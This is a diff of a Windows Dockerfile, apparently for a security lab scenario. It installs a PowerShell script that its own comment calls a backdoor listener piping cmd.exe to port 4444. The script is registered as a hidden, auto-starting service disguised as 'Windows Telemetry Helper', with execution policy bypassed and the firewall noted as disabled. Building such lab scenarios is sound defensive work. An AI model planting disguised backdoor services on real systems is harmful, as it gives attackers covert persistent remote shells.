@@ -8,7 +8,7 @@ SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$E
 # LocalSystem. The script listens on 4444/TCP and pipes stdin/stdout of cmd.exe to
 # the socket — a classic backdoor listener.
 RUN New-Item -ItemType Directory -Path C:\ProgramData\WinTelemetry -Force | Out-Null
-COPY svc.ps1 C:/ProgramData/WinTelemetry/svc.ps1
+COPY scenario-19-rogue-listener-service/svc.ps1 C:/ProgramData/WinTelemetry/svc.ps1
 RUN New-Service -Name 'WinTelemetrySvc' -DisplayName 'Windows Telemetry Helper' -BinaryPathName 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\WinTelemetry\svc.ps1' -StartupType Automatic
 # Firewall is disabled in the base image; no explicit allow rule required.
 
